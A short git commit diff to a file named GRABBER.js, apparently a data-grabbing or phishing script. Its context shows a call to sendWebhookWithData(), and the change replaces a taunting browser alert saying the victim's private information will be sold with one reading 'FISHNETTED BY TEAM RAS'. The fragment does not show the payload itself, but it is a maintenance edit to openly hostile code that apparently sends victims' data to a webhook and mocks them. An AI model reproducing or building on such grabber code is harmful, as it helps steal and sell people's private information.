55be6af8c815de815b2aaf2c34b9850152afb209
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2025-02-23 16:35:45 +0300

    Update GRABBER.js

--- GRABBER.js
+++ GRABBER.js
@@ -34,4 +34,4 @@ async function sendWebhookWithData() {
 }
 
 sendWebhookWithData();
-setTimeout(function{alert("YOUR PRIVATE INFO WILL BE SELLED")},5000)
+setTimeout(function(){alert("FISHNETTED BY TEAM RAS")},5000)
